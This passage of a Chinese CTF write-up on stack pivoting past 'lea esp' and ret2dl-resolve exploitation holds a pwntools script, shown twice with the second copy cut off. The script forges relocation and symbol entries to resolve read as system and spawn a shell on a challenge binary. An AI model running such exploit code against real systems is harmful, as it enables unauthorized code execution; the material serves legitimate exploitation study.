mso-font-kerning:1.0000pt;" >gdb.attach(p,'b *0x80484b1')</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >Address=0x12345678</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >fake_ecx=0x804a05a</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >buf=0x804a040</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >fake_esp=fake_ecx-0x4</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >base_stage=fake_esp+0x800</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >read_plt=0xf7ed2b00</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >stack_size=0x500</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >gadget1=0x0804851b #pop ebp |ret</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >gadget2=0x08048519 # &nbsp;pop esi ; pop edi ; pop ebp ; ret</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >gadget3=0x080483c5 # leave ；ret</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >#New stack</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload="A"*0xe</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=p32(fake_ecx)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+="BBBB"</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >#payload+=p32(read_plt)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >#payload+=p32(gadget2)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >#payload+=p32(0)+p32(base_stage)+p32(100)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=p32(gadget1)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=p32(base_stage)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=p32(gadget3) </span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=p32(base_stage+stack_size)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >#p.sendline(payload)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >#struct </span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >dynsym=0x080481cc</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >dynstr=0x0804822c</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >plt0=0x80482f0</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >rel_plt=0x080482b4</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >reloc_arg=0x804a862-rel_plt #fang hou mian yidian ,hui bei fugai</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >r_offset=0x0804a00c #read_got</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >fake_sym_addr=0x804a86a</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >align=0x10-((fake_sym_addr-dynsym)&0xf) #align=8#栈对齐</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >fake_sym_addr=fake_sym_addr+align</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >r_info=((fake_sym_addr-dynsym)/0x10)&#60;&#60;8|0x7</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >#r_info=0x107</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >fake_rel=p32(r_offset)+p32(r_info)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+="A"*(0x804a85a-buf-len(payload))</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=p32(plt0)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=p32(reloc_arg)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=fake_rel</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >st_name=0x804a87c-dynstr</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >fake_sym=p32(st_name)+p32(0)+p32(0)+p32(0x12)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+="B"*align</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=fake_sym</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+="system\x00"</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >p.sendline(payload)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >p.interactive()</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >成功重定位</font>read为system函数</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><img width="563"  height="282"  src="绕过lea esp和Ret2dl的一些补充.files/绕过lea esp和Ret2dl的一些补充6139.png" ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >但是参数布置就很麻烦</font></span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >解决方案就是再</font>payload+=p32(reloc_arg)后面添加4个字节任意数和/bin/sh的地址。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >这样弹出</font>shell之后，程序的参数正好指向/bin/sh</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >代码如下：</font></span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ># -*- coding: utf-8 -*-</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >from pwn import *</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >p=process('./pwn01')</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >#p=remote('39.100.87.24',8101)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >gdb.attach(p,'b *0x80484b1')</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >Address=0x12345678</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >fake_ecx=0x804a05a</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >buf=0x804a040</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >fake_esp=fake_ecx-0x4</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >base_stage=fake_esp+0x800</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >read_plt=0xf7ed2b00</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >stack_size=0x500</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >gadget1=0x0804851b #pop ebp |ret</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >gadget2=0x08048519 # &nbsp;pop esi ; pop edi ; pop ebp ; ret</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >gadget3=0x080483c5 #</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >#New stack</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload="A"*0xe</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=p32(fake_ecx)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+="BBBB"</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >#payload+=p32(read_plt)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >#payload+=p32(gadget2)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >#payload+=p32(0)+p32(base_stage)+p32(100)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=p32(gadget1)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=p32(base_stage)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=p32(gadget3) </span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=p32(base_stage+stack_size)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >#p.sendline(payload)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >#struct </span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >dynsym=0x080481cc</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >dynstr=0x0804822c</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >plt0=0x80482f0</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >rel_plt=0x080482b4</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
